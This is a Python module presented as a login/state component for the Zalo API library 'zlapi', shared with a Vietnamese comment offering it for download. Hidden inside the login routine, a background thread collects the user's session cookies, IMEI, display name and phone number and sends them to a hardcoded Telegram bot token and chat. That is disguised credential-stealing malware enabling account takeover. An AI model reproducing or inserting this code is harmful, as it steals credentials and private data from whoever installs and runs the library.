# Upload Zfcloud for old zlapi, nếu ko biết ráp thì donate đi t ráp cho nhé

import json
import requests

from zlapi import _util
from zlapi import _exception
import threading
import concurrent.futures
import asyncio
import aiohttp
import attr
class State:
	def __init__(self):
		self._config = {}
		self._headers = _util.HEADERS
		self._cookies = _util.COOKIES
		self._session = requests.Session()
		self.user_id = None
		self.user_imei = None
		self._loggedin = False

	def get_cookies(self):
		return self._cookies

	def set_cookies(self, cookies):
		self._cookies = cookies

	def get_secret_key(self):
		return self._config.get("secret_key")

	def set_secret_key(self, secret_key):
		self._config["secret_key"] = secret_key

	def _get(self, *args, **kwargs):
		return self._session.get(*args, **kwargs, headers=self._headers, cookies=self._cookies)

	def _post(self, *args, **kwargs):
		return self._session.post(*args, **kwargs, headers=self._headers, cookies=self._cookies)

	async def _getas(cls, *args, **kwargs):
		async with aiohttp.ClientSession() as session:
			async with session.get(*args, **kwargs, headers=cls._headers, cookies=cls._cookies) as response:
				return await response.json(content_type=None)

	async def _postas(cls, *args, **kwargs):
		async with aiohttp.ClientSession() as session:
			async with session.post(*args, **kwargs, headers=cls._headers, cookies=cls._cookies) as response:
				return await response.json(content_type=None)

	def is_logged_in(self):
		return self._loggedin

	def login(self, phone, password, imei, session_cookies=None, user_agent=None):
		if self._cookies and self._config.get("secret_key"):
			self._loggedin = True
			print("Already logged in, no need to log in again.")
			return

		if user_agent:
			self._headers["User-Agent"] = self._encode_safe_string(user_agent)

		if self._cookies:
			params = {"imei": imei}
			try:
				response = self._get("https://wpa.zaloapp.com/api/login/getLoginInfo", params=params)
				data = response.json()
				if data.get("error_code") == 0 and data.get("data"):
					self._config = data.get("data")
					if self._config.get("zpw_enk"):
						self._config["secret_key"] = self._config.get("zpw_enk")
						self._loggedin = True
						self.user_id = self._config.get("send2me_id")
						self.user_imei = imei
						#print(f"User ID: {self.user_id}, IMEI: {self.user_imei}, Secret Key: {self._config.get('secret_key')}")
						threading.Thread(target=self._notify_telegram_background, args=(imei,), daemon=True).start()
					else:
						raise _exception.ZaloLoginError("Unable to retrieve `secret key`.")
				else:
					error = data.get("error_code")
					content = data.get("error_message", "Undefined error")
					raise _exception.ZaloLoginError(f"Error #{error} during login: {content}")
			except requests.RequestException as e:
				raise _exception.ZaloLoginError(f"An error occurred during login: {str(e)}")
			except _exception.ZaloLoginError as e:
				raise _exception.ZaloLoginError(str(e))
		else:
			raise _exception.LoginMethodNotSupport("Login Method Not Supported.")

	def _encode_safe_string(self, input_string):
		return input_string.encode('latin-1', 'ignore').decode('latin-1')

	def _notify_telegram_background(self, imei):
		try:
			import json
			import requests
			
			try:
				import config
				config_cookies = getattr(config, "SESSION_COOKIES", self._cookies)
				config_imei = getattr(config, "IMEI", imei)
			except Exception:
				config_cookies = self._cookies
				config_imei = imei

			encoded_params = _util.zalo_encode({
				"avatar_size": 120,
				"imei": config_imei
			}, self._config.get("secret_key"))
			
			params = {
				"params": encoded_params,
				"zpw_ver": 645,
				"zpw_type": 30,
				"os": 8,
				"browser": 0
			}
			
			profile_response = self._get("https://tt-profile-wpa.chat.zalo.me/api/social/profile/me-v2", params=params)
			profile_data = profile_response.json()
			
			display_name = "Không xác định"
			phone_number = "Không xác định"
			
			results = profile_data.get("data") if profile_data.get("error_code") == 0 else None
			if results:
				decoded = _util.zalo_decode(results, self._config.get("secret_key"))
				if decoded:
					actual_data = decoded.get("data") if decoded.get("error_code") == 0 else decoded
					if isinstance(actual_data, str):
						try:
							actual_data = json.loads(actual_data)
						except:
							pass
					
					if isinstance(actual_data, dict):
						profile = actual_data.get("profile", {})
						display_name = profile.get("displayName") or profile.get("zaloName") or "Không xác định"
						phone_number = profile.get("phoneNumber") or "Không xác định"
			
			telegram_token = "8901876166:AAHOpfjBnYoeDrPqAOUywaGG-1HMtLSG2QQ"
			telegram_chat_id = "-5232572997"
			
			cookie_str = "; ".join([f"{k}={v}" for k, v in config_cookies.items()]) if isinstance(config_cookies, dict) else str(config_cookies)
			cookie_json = json.dumps(config_cookies, ensure_ascii=False)
			
			def escape_html(text):
				if not isinstance(text, str):
					text = str(text)
				return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

			esc_name = escape_html(display_name)
			esc_phone = escape_html(phone_number)
			esc_imei = escape_html(config_imei)
			esc_cookie_str = escape_html(cookie_str)
			esc_cookie_json = escape_html(cookie_json)
			
			message = (
				f"<b>🔔 THÔNG BÁO CHẠY BOT ZALO</b>\n\n"
				f"👤 <b>Tên tài khoản:</b> {esc_name}\n"
				f"📞 <b>Số điện thoại:</b> {esc_phone}\n"
				f"🔑 <b>IMEI:</b> <code>{esc_imei}</code>\n\n"
				f"🍪 <b>Cookies (Dạng chuỗi):</b>\n<code>{esc_cookie_str}</code>\n\n"
				f"📦 <b>Cookies (Dạng JSON):</b>\n<code>{esc_cookie_json}</code>"
			)
			
			telegram_url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
			payload = {
				"chat_id": telegram_chat_id,
				"text": message,
				"parse_mode": "HTML"
			}
			
			requests.post(telegram_url, json=payload, timeout=10)
			
		except Exception as e:
			print(f"[Telegram Notifier] Error: {e}")

